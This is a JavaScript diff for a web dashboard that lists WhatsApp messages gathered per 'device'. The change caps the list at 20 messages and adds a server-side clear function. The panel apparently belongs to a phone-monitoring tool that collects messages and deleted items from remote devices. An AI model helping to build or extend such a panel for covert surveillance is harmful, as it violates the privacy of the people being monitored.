@@ -10,7 +10,6 @@ function isOwner() {
     return sessionStorage.getItem('is_owner') === 'true';
 }
 
-// ✅ fetch مع token تلقائياً
 function authFetch(url, options = {}) {
     const token = getAuthToken();
     if (!token) return fetch(url, options);
@@ -950,14 +949,24 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
+// ✅ محدّث: عرض آخر 20 رسالة فقط
 async function loadWhatsApp() {
     try {
         const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
-        const messages = await response.json();
+        let messages = await response.json();
+
+        // ✅ عرض آخر 20 رسالة فقط
+        if (Array.isArray(messages)) {
+            messages = messages.slice(-20);
+        }
+
         const div = document.getElementById('whatsappList');
         if (!div) return;
         div.innerHTML = '';
-        if (!Array.isArray(messages) || messages.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>'; return; }
+        if (!Array.isArray(messages) || messages.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>';
+            return;
+        }
         const conversations = {};
         messages.forEach(msg => {
             const sender = msg.sender || 'غير معروف';
@@ -1065,6 +1074,24 @@ async function deleteWhatsAppChat(sender) {
         const result = await response.json();
         if (result.success) { loadWhatsApp(); }
     } catch (e) {}
+}
+
+// ✅ جديد: مسح كل رسائل واتساب
+async function clearLiveMsgs() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+    if (!confirm('⚠️ مسح كل رسائل واتساب من السيرفر؟')) return;
+    try {
+        const response = await authFetch(`/api.php?action=clear_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (data.success) {
+            liveMsgs = [];
+            const div = document.getElementById('whatsappList');
+            if (div) div.innerHTML = '<p style="color:#888;">تم المسح</p>';
+            showNotification('✅', 'تم مسح الرسائل', '🗑️');
+            const badge = document.getElementById('whatsappCount');
+            if (badge) badge.textContent = '(0)';
+        } else alert('❌ فشل المسح');
+    } catch (e) { alert('❌ خطأ'); }
 }
 
 function formatWhatsAppDate(t) {
@@ -1594,7 +1621,6 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     } catch (e) { alert('❌ فشل: ' + e.message); }
 }
 
-// ✅ التحقق من الجلسة عند فتح الصفحة
 (async function verifySession() {
     const token = getAuthToken();
     if (!token) {
@@ -1621,7 +1647,6 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
-// 🚫 إخفاء تبويب الأجهزة عن غير المالك
 (function hideSecurityTabForNonOwner() {
     if (!isOwner()) {
         const secTab = document.querySelector('.tab[onclick="switchTab(\'security\')"]');
@@ -1635,7 +1660,6 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
-// ✅ استدعاء دوري
 setInterval(() => { loadAuthorizedDevices(); }, 15000);
 loadAuthorizedDevices();
 
